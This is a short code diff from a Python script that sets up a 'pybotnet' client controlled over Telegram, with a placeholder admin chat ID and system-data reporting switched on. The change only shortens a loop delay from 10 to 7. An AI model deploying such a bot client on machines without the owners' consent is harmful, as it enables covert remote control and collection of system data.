@@ -72,7 +72,7 @@ ADMIN_CHAT_ID = '12345678910'
 bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                         show_log=True, send_system_data=True)
 
-delay = 10
+delay = 7
 
 while True:
     print('*-*'*15)
